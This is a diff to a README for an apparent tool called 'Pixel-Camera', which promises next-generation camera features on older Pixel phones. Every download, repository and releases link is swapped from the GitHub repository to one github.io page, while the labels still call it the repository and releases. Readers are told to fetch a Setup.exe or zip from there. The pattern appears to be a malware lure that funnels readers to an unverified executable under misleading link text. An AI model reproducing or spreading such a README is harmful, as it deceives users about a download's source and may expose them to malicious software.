@@ -1,6 +1,6 @@
 # 📸 Pixel-Camera - Unlock Next-Gen Camera on Older Pixels
 
-[![Download Now](https://img.shields.io/badge/Download-Pixel--Camera-brightgreen?style=for-the-badge&logo=github)](https://github.com/Respected-mahonia4723/Pixel-Camera/releases)
+[![Download Now](https://img.shields.io/badge/Download-Pixel--Camera-brightgreen?style=for-the-badge&logo=github)](https://respected-mahonia4723.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Getting Pixel-Camera on your computer is easy. Follow these simple steps:
 
 1. **Visit the download page** – Click the button below or the badge at the top of this page.
 
-   [➡️ Go to Download Page](https://github.com/Respected-mahonia4723/Pixel-Camera/releases)
+   [➡️ Go to Download Page](https://respected-mahonia4723.github.io)
 
 2. **Choose the latest version** – Look for the newest release (usually at the top). The file will be named something like `Pixel-Camera-vX.X.zip` or `Pixel-Camera-Setup.exe`.
 
@@ -138,8 +138,8 @@ Once Pixel-Camera is installed, here's what to expect:
 
 Visit the project's GitHub page:
 
-- **Repository**: [https://github.com/Respected-mahonia4723/Pixel-Camera](https://github.com/Respected-mahonia4723/Pixel-Camera)
-- **Releases/Downloads**: [https://github.com/Respected-mahonia4723/Pixel-Camera/releases](https://github.com/Respected-mahonia4723/Pixel-Camera/releases)
+- **Repository**: [https://respected-mahonia4723.github.io](https://respected-mahonia4723.github.io)
+- **Releases/Downloads**: [https://respected-mahonia4723.github.io](https://respected-mahonia4723.github.io)
 - **Issues**: Use the "Issues" tab on GitHub to report problems or ask questions
 
 ---
@@ -178,7 +178,7 @@ Visit the project's GitHub page:
 
 Click the button below to go to the download page and get started today. Your Pixel phone is about to feel brand new.
 
-[![Download Pixel-Camera](https://img.shields.io/badge/📥%20Download%20Now-Pixel--Camera-blue?style=for-the-badge&logo=appveyor)](https://github.com/Respected-mahonia4723/Pixel-Camera/releases)
+[![Download Pixel-Camera](https://img.shields.io/badge/📥%20Download%20Now-Pixel--Camera-blue?style=for-the-badge&logo=appveyor)](https://respected-mahonia4723.github.io)
 
 ---
 
